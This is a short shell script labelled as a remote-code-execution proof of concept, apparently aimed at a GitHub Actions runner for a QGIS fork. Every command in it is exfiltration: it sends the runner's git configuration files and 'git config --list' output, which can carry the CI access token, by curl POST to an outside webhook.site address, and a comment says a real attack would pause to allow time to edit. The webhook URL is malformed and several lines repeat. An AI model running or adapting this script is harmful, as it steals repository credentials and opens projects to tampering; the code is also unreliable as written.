#filename: myscript.sh
echo -------------poc_rce-------------- >&2



export webhook="https://webhook.site/https://webhook.site/0adc90cc-a61d-4cda-b4f5-c4bc887c7336"
export repo=barakharyati/QGIS-fork

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/work/${repo}/.git/config)" \
    "$webhook/githubtoken"


curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/work/${repo}/.git/config)" \
    "$webhook/githubtoken"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(git config --list)" \
    "$webhook/githubtoken"



curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/.gitconfig)" \
    "$webhook/githubtoken"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/work/${repo}/.git/config)" \
  "$webhook/githubtoken"


git config --list >&2
sleep 2 # in real attack it will be 1200 to have time to edit 
